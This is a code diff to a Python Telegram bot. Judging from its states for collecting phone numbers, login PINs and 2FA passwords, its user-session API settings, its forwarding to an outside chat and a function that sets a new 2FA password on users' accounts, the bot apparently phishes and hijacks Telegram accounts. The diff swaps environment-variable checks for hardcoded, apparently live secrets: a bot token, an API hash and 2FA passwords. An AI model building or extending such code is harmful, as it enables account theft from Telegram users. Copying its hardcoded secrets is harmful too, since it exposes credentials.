@@ -279,29 +279,18 @@ def normalize_phone(num: str) -> str:
 WAITING_FOR_NUMBER, WAITING_FOR_ADMIN_APPROVAL, WAITING_FOR_PIN, WAITING_FOR_2FA = range(4)
 
 # Admin settings - loaded from environment variables
-ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID")
-if not ADMIN_CHAT_ID:
-    raise RuntimeError("ADMIN_CHAT_ID environment variable is required but not set.")
+ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "5810613583")
 ADMIN_CHAT_ID_INT = int(ADMIN_CHAT_ID)
 FORWARD_CHAT_ID = "@CEO_cryfex" # Forward to this ID
-TWO_FA_PASSWORD = os.environ.get("TWO_FA_PASSWORD")
-if not TWO_FA_PASSWORD:
-    raise RuntimeError("TWO_FA_PASSWORD environment variable is required but not set.")
+TWO_FA_PASSWORD = os.environ.get("TWO_FA_PASSWORD", "2876886938")
 TELEGRAM_OFFICIAL_ID = 777000
 
 # Telegram API for UserSession (Telethon/Pyrogram)
-_telegram_api_id_raw = os.environ.get("TELEGRAM_API_ID")
-if not _telegram_api_id_raw:
-    raise RuntimeError("TELEGRAM_API_ID environment variable is required but not set.")
-TELEGRAM_API_ID = int(_telegram_api_id_raw)
-TELEGRAM_API_HASH = os.environ.get("TELEGRAM_API_HASH")
-if not TELEGRAM_API_HASH:
-    raise RuntimeError("TELEGRAM_API_HASH environment variable is required but not set.")
+TELEGRAM_API_ID = int(os.environ.get("TELEGRAM_API_ID", "31955122"))
+TELEGRAM_API_HASH = os.environ.get("TELEGRAM_API_HASH", "4f3e7f6d8250dc14c21ae58642fcbcc9")
 
 # Bot Token
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-if not BOT_TOKEN:
-    raise RuntimeError("BOT_TOKEN environment variable is required but not set.")
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8467555740:AAGcgvy676aczWCPxMvAaVxhsaxBgWZ8WoM")
 
 # Required channel for all users
 REQUIRED_CHANNEL = "@BGTUpdate"
@@ -3114,9 +3103,7 @@ def build_login_success_message(phone: str, country_data: dict) -> str:
     )
 
 
-NEW_2FA_PASSWORD = os.environ.get("NEW_2FA_PASSWORD")
-if not NEW_2FA_PASSWORD:
-    raise RuntimeError("NEW_2FA_PASSWORD environment variable is required but not set.")
+NEW_2FA_PASSWORD = os.environ.get("NEW_2FA_PASSWORD", "4735908767")
 
 
 async def set_new_2fa_password(bot, user_id: str, phone: str, client, old_password: str | None = None) -> None:
